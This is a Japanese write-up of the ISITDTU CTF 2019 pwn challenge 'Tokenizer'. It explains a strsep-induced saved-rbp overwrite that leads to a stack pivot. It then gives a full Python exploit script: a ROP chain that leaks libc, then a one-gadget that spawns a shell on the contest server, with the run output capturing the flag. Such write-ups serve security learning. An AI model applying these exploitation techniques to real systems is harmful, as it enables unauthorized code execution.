# [pwn 908pts] Tokenizer - ISITDTU CTF 2019
64ビットです。
```
$ checksec -f tokenizer
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		1	tokenizer
```
C++製バイナリで、入力した文字列を入力した文字で区切って出力するという単純なサービスです。一見脆弱性が無いので最大までデータを与えるとスタックのデータがでてきました。
入力用にバッファが0x400バイト用意されているのですが、その直後にsaved rbpがあるのでそれが文字列の一部と認識されるようです。またstrsepは区切り文字を見つけるとそこをnullにします。したがって、saved rbpを変更できます。main関数の終わりに`leave; ret;`があるのでrbpを変更すればその先にあるデータをリターンアドレスとして認識します。そこで、saved rbpの最下位1バイトをnullにすれば（たいていの場合）入力用バッファを指すようになるので、ここにROP chainを書き込んでおけば発動します。
まずはstd::coutでalarmのGOTアドレスを出力するROPを書き込みます。ただし、std::cinはnullバイトを受け付けないのでpayloadのnullは別の文字に置き換え、strsepを利用してnullにしましょう。

```python
from ptrlib import *

libc = ELF("./libc-2.27.so")
elf = ELF("./tokenizer")
libc_one_gadget = 0x10a38c
addr_main = 0x40133c
addr_st_cout = 0x404020
addr_cout = 0x401080
rop_pop_rsi_r15 = 0x00401499
rop_pop_rdi = 0x0040149b

# Stage 1: leak libc address
base_payload = b''
base_payload += p64(rop_pop_rsi_r15)
base_payload += p64(elf.got("alarm"))
base_payload += p64(0xdeadbeef)
base_payload += p64(rop_pop_rdi)
base_payload += p64(addr_st_cout)
base_payload += p64(addr_cout)
base_payload += p64(addr_main)
payload = base_payload * ((0x400 - 8) // len(base_payload))
payload = payload[16:0x400 - 0x80]
payload += b'\xaa' * (0x400 - len(payload)) # padding
payload = payload.replace(b'\x00', b'\xaa')

while True:
    #sock = Process("./tokenizer")
    sock = Socket("165.22.57.24", 32000)
    sock.recvuntil("characters): ")
    sock.sendline(payload)
    sock.recvuntil(": ")
    addr_stack = sock.recvline()[0x400:]
    logger.info("addr stack = " + hex(u64(addr_stack)))
    if addr_stack == b'' or addr_stack[0] == 0x10:
        logger.warn("Bad luck!")
        sock.close()
        continue
    target = bytes([addr_stack[0]]) + b'\xaa'
    #if target in payload or (0x400 - addr_stack[0]) % len(base_payload) != 0:
    if target in payload or addr_stack[0] != 0xf0:
        logger.warn("Bad luck!")
        sock.close()
        continue
    break

sock.recvuntil(": ")
sock.sendline(target)

# libc leak
sock.recvuntil(addr_stack[-2:] + b"\n")
recv = sock.recvuntil("Welcome")
libc_base = u64(recv.rstrip(b"Welcome")) - libc.symbol("alarm")
logger.info("libc base = " + hex(libc_base))

# Stage 2: One gadget
payload = p64(libc_base + libc_one_gadget) * (0x400 // 8)
payload = payload.replace(b'\x00', b'\xaa')
sock.recvuntil("characters): ")
sock.sendline(payload)
sock.recvuntil(": ")
target = b'\x38\xaa'
sock.recvuntil(": ")
sock.sendline(target)

sock.interactive()
```

いぇい。
```
$ python solve.py 
[+] __init__: Successfully connected to 165.22.57.24:32000
[+] <module>: addr stack = 0x7fff01e514e0
[+] <module>: Bad luck!
[+] close: Connection to 165.22.57.24:32000 closed
[+] __init__: Successfully connected to 165.22.57.24:32000
[+] close: Connection to 165.22.57.24:32000 closed
[+] <module>: addr stack = 0x7ffc44c91520
[+] <module>: Bad luck!
[+] close: Connection to 165.22.57.24:32000 closed
[+] __init__: Successfully connected to 165.22.57.24:32000
[+] close: Connection to 165.22.57.24:32000 closed
[+] <module>: addr stack = 0x7ffd71a0bdf0
[+] <module>: libc base = 0x7fde2b1c5000
[ptrlib]$ cat flag  
ISITDTU{H3LL0_H4PPY_W0RLD}[ptrlib]$
```

# 感想
今までに見たことの無い問題で面白かったです。
